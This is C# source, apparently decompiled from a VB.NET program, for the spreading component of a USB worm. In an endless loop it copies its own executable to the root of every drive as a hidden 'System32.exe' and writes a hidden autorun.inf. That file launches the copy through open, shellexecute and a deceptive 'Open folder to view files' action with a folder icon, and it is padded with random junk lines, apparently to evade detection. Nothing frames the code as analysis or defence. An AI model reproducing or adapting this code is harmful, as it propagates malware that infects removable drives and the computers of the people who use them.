using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class usb
{
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long dwMilliseconds);

	public static void Usb1()
	{
		int num;
		do
		{
			num = 1;
			try
			{
				string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
				string[] logicalDrives = Directory.GetLogicalDrives();
				string[] array = logicalDrives;
				for (int i = 0; i < array.Length; i = checked(i + 1))
				{
					programFiles = array[i];
					if (!File.Exists(programFiles + "System32.exe"))
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "System32.exe");
					}
					StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine("[autorun];" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine("open=System32.exe;" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine("shellexecute=System32.exe;" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine("action=Open folder to view files;" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine(";" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.WriteLine("icon=%SystemRoot%\\system32\\SHELL32.dll,4;" + Pass.RandomPassword.Generate(200, 400));
					streamWriter.Close();
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "System32.exe", FileAttributes.Hidden);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Sleep(120000L);
		}
		while (num != 10);
	}
}
